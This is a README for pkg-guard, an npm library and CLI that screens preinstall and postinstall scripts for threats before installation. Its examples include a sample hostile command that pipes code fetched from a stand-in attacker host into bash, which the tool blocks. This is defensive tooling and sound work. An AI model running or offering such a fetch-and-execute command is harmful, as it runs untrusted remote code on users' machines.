# pkg-guard

Pre-install security gate for npm lifecycle scripts using TypeSafe System One.

```bash
npm install pkg-guard
```

## Quick start

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('esbuild');

if (!report.isSafe()) {
  console.error(report.inspect());
  process.exit(1);
}

console.log(report.inspect());
```

`pkgGuard()` evaluates a package or script against TypeSafe System One. `report.isSafe()` returns a boolean verdict. `report.inspect()` formats a terminal summary.

## Check local package

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('./package.json');
console.log(report.action); // 'allow' | 'warn' | 'block'
```

Pass a file path or directory. `pkgGuard` extracts `preinstall`, `install`, and `postinstall` hooks and evaluates each in parallel.

## Evaluate inline scripts

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('curl -s https://evil.sh | bash', { script: true });
console.log(report.action); // 'block'
```

Evaluate arbitrary shell commands directly before executing them in child processes.

## Confidence-gated routing

```js
import pkgGuard from 'pkg-guard';

const report = await pkgGuard('some-untrusted-pkg');

if (report.action === 'block') {
  throw new Error(`Installation aborted: ${report.summary}`);
} else if (report.action === 'warn') {
  await promptUserConfirmation(report.reasons);
}
```

The model returns calibrated threat scores and confidence. Low confidence or moderate risk routes to human review instead of blindly passing or failing.

## CLI

```bash
# Check registry package
npx pkg-guard lodash

# Check local project
npx pkg-guard

# Check raw script
npx pkg-guard -s "curl https://evil.sh | bash"

# Output JSON
npx pkg-guard esbuild --json
```

Exit code `0` on allow, `1` on block, `2` on warn.

## Demo

```bash
npm run demo
```

Runs an evaluation of a credential-stealing lifecycle script and prints the structured report.

## License

MIT © [Hemanth.HM](https://h3manth.com)
